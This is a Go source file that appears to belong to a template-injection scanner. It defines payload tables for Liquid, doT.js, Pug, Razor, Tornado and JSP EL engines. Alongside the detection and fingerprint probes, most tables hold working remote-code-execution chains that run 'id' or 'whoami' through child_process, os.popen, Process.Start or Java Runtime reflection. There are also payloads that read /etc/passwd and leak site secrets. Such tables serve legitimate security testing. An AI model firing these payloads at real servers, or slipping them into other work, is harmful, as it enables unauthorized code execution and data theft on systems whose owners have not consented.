package ssti

// Engine payload tables for the modern / language-specific SSTI engines.
// Each table opens with a detection / fingerprint payload and adds
// engine-specific RCE chains where one exists.
// Source: HackTricks, PayloadsAllTheThings, engine-vendor documentation.

// Liquid (Ruby / Shopify). Detection via {{ math }}; RCE chain via
// the Shopify-extended `assign` + dangerous filters is engine-fork
// dependent (Jekyll / Liquid Drop class) — included for fingerprint.
var liquidPayloads = []Payload{
	{
		Value:           "{{7*7}}",
		Engine:          EngineLiquid,
		Type:            TypeDetection,
		Description:     "Liquid math — renders blank/literal (negative fingerprint vs Jinja2/Twig that emit '49')",
		DetectionMethod: MethodReflection,
		ExpectedOutput:  "",
	},
	{
		Value:           "{{'a'.size}}",
		Engine:          EngineLiquid,
		Type:            TypeFingerprint,
		Description:     "Liquid string .size filter",
		DetectionMethod: MethodReflection,
		ExpectedOutput:  "1",
	},
	{
		Value:           "{% assign x = 'a' | upcase %}{{x}}",
		Engine:          EngineLiquid,
		Type:            TypeFingerprint,
		Description:     "Liquid assign + upcase filter",
		DetectionMethod: MethodReflection,
		ExpectedOutput:  "A",
	},
	{
		Value:           "{{ site.secrets }}",
		Engine:          EngineLiquid,
		Type:            TypeConfigLeak,
		Description:     "Liquid/Jekyll site config leak",
		DetectionMethod: MethodReflection,
	},
}

// doT.js (JavaScript). {{= expr }} runs JavaScript; {{ }} is JS code
// block — both reach a full JS context, so RCE is trivial once the
// engine is confirmed.
var dotPayloads = []Payload{
	{
		Value:           "{{=7*7}}",
		Engine:          EngineDot,
		Type:            TypeDetection,
		Description:     "doT.js interpolation math",
		DetectionMethod: MethodMath,
		ExpectedOutput:  "49",
	},
	{
		Value:           "{{=process.mainModule.require('child_process').execSync('id').toString()}}",
		Engine:          EngineDot,
		Type:            TypeRCE,
		Description:     "doT.js RCE via process.mainModule.require",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "uid=",
	},
	{
		Value:           "{{=global.process.mainModule.require('fs').readFileSync('/etc/passwd')}}",
		Engine:          EngineDot,
		Type:            TypeFileRead,
		Description:     "doT.js file read via fs",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "root:",
	},
}

// Pug / Jade (Node.js). Compile-time RCE via `#{ expr }` and the
// `-` line prefix that executes JS. Detection uses #{7*7}.
var pugPayloads = []Payload{
	{
		Value:           "#{7*7}",
		Engine:          EnginePug,
		Type:            TypeDetection,
		Description:     "Pug interpolation math",
		DetectionMethod: MethodMath,
		ExpectedOutput:  "49",
	},
	{
		Value:           "#{global.process.mainModule.require('child_process').execSync('id')}",
		Engine:          EnginePug,
		Type:            TypeRCE,
		Description:     "Pug RCE via global.process",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "uid=",
	},
	{
		Value:           "- var x = global.process.mainModule.require('child_process').execSync('id').toString()\np= x",
		Engine:          EnginePug,
		Type:            TypeRCE,
		Description:     "Pug RCE via `-` code prefix",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "uid=",
	},
}

// Razor (.NET ASP.NET / ASP.NET Core). @{ } blocks run C#. The
// classic detection idiom is `@(7*7)`. RCE uses System.Diagnostics
// or — on full .NET Framework — the raw cmd.exe handle.
var razorPayloads = []Payload{
	{
		Value:           "@(7*7)",
		Engine:          EngineRazor,
		Type:            TypeDetection,
		Description:     "Razor expression math",
		DetectionMethod: MethodMath,
		ExpectedOutput:  "49",
	},
	{
		Value:           "@System.Diagnostics.Process.Start(\"cmd.exe\",\"/c whoami\")",
		Engine:          EngineRazor,
		Type:            TypeRCE,
		Description:     "Razor RCE via Process.Start (Windows)",
		DetectionMethod: MethodOutput,
	},
	{
		Value:           "@{var c = new System.Diagnostics.ProcessStartInfo(\"id\"); c.RedirectStandardOutput = true; c.UseShellExecute = false; var p = System.Diagnostics.Process.Start(c); @p.StandardOutput.ReadToEnd()}",
		Engine:          EngineRazor,
		Type:            TypeRCE,
		Description:     "Razor RCE with captured stdout (Linux .NET Core)",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "uid=",
	},
}

// Tornado (Python). {{ expr }} runs Python in the template scope.
// `__import__` is always reachable so the RCE chain is short.
var tornadoPayloads = []Payload{
	{
		Value:           "{{7*7}}",
		Engine:          EngineTornado,
		Type:            TypeDetection,
		Description:     "Tornado math (overlaps Jinja2 — disambiguate via concat)",
		DetectionMethod: MethodMath,
		ExpectedOutput:  "49",
	},
	{
		Value:           "{{7*'7'}}",
		Engine:          EngineTornado,
		Type:            TypeFingerprint,
		Description:     "Tornado does NOT repeat-concat strings (jinja2 → 7777777, tornado → error)",
		DetectionMethod: MethodError,
		ErrorPatterns:   []string{"can't multiply sequence", "TypeError"},
	},
	{
		Value:           "{% import os %}{{os.popen('id').read()}}",
		Engine:          EngineTornado,
		Type:            TypeRCE,
		Description:     "Tornado RCE via {% import os %}",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "uid=",
	},
	{
		Value:           "{{__import__('os').popen('id').read()}}",
		Engine:          EngineTornado,
		Type:            TypeRCE,
		Description:     "Tornado RCE via __import__",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "uid=",
	},
}

// JSP / EL (Java Expression Language). ${ ... } evaluates EL; #{ ... }
// is "deferred EL" (JSF). On Tomcat with TARGET_TYPE_ENABLED, the
// pageContext.getServletContext chain reaches a Runtime instance.
var jspELPayloads = []Payload{
	{
		Value:           "${7*7}",
		Engine:          EngineJSPEL,
		Type:            TypeDetection,
		Description:     "JSP EL math",
		DetectionMethod: MethodMath,
		ExpectedOutput:  "49",
	},
	{
		Value:           "#{7*7}",
		Engine:          EngineJSPEL,
		Type:            TypeDetection,
		Description:     "JSP deferred EL math (JSF)",
		DetectionMethod: MethodMath,
		ExpectedOutput:  "49",
	},
	{
		Value:           "${pageContext.request.serverInfo}",
		Engine:          EngineJSPEL,
		Type:            TypeFingerprint,
		Description:     "JSP EL — serverInfo leak (Tomcat/JBoss/WebLogic identifier)",
		DetectionMethod: MethodReflection,
	},
	{
		Value:           "${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}",
		Engine:          EngineJSPEL,
		Type:            TypeRCE,
		Description:     "JSP EL RCE via reflection chain",
		DetectionMethod: MethodOutput,
	},
	{
		Value:           "${\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('id')\")}",
		Engine:          EngineJSPEL,
		Type:            TypeRCE,
		Description:     "JSP EL RCE via ScriptEngineManager (Nashorn)",
		DetectionMethod: MethodOutput,
	},
}
